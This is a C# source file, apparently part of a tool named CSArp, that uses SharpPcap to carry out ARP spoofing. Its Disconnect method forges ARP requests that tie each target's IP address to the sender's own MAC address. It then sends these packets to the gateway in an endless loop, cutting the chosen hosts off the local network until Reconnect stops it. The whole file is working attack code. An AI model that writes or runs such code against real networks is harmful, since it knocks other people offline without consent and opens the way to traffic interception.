using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;
using System.Diagnostics;

namespace CSArp
{
    public static class DisconnectReconnect
    {
        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private static bool disengageflag = true;
        private static ICaptureDevice capturedevice;

        public static void Disconnect(
            IView view,
            Dictionary<IPAddress, PhysicalAddress> targetlist,
            IPAddress gatewayipaddress,
            PhysicalAddress gatewaymacaddress,
            string interfacefriendlyname)
        {
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            capturedevice = (from devicex in CaptureDeviceList.Instance where ((SharpPcap.Npcap.NpcapDevice)devicex).Interface.FriendlyName == interfacefriendlyname select devicex).ToList()[0];
            capturedevice.Open();
            foreach (var target in targetlist)
            {
                IPAddress myipaddress = ((SharpPcap.Npcap.NpcapDevice)capturedevice).Addresses[1].Addr.ipAddress; //possible critical point : Addresses[1] in hardcoding the index for obtaining ipv4 address
                var operation = ArpOperation.Request;
                var targetHardwareAddress = PhysicalAddress.Parse("00-00-00-00-00-00");//use loop back address since it is ignored in  arp request
                var targetProtocolAddress = gatewayipaddress;
                var senderHardwareAddress = capturedevice.MacAddress;
                var senderProtocolAddress = target.Key;

                ArpPacket arppacketforgatewayrequest = new ArpPacket(
                    operation, targetHardwareAddress, targetProtocolAddress, senderHardwareAddress, senderProtocolAddress);

                var sourceHardwareAddress = capturedevice.MacAddress;
                var destinationHardwareAddress = gatewaymacaddress;
                var ethernetType = EthernetType.Arp;

                var ethernetpacketforgatewayrequest = new EthernetPacket(
                    sourceHardwareAddress, destinationHardwareAddress, ethernetType)
                {
                    PayloadPacket = arppacketforgatewayrequest
                };
                new Thread(() =>
                {
                    disengageflag = false;
                    DebugOutputClass.Print(view, "Spoofing target " + target.Value.ToString() + " @ " + target.Key.ToString());
                    try
                    {
                        while (!disengageflag)
                        {
                            capturedevice.SendPacket(ethernetpacketforgatewayrequest);
                        }
                    }
                    catch (PcapException ex)
                    {
                        DebugOutputClass.Print(view, "PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
                    }
                    DebugOutputClass.Print(view, "Spoofing thread @ DisconnectReconnect.Disconnect() for " + target.Value.ToString() + " @ " + target.Key.ToString() + " is terminating.");
                }).Start();
                engagedclientlist.Add(target.Key, target.Value);
            };
        }

        public static void Reconnect()
        {
            disengageflag = true;
            if (engagedclientlist != null)
                engagedclientlist.Clear();
        }

    }

}
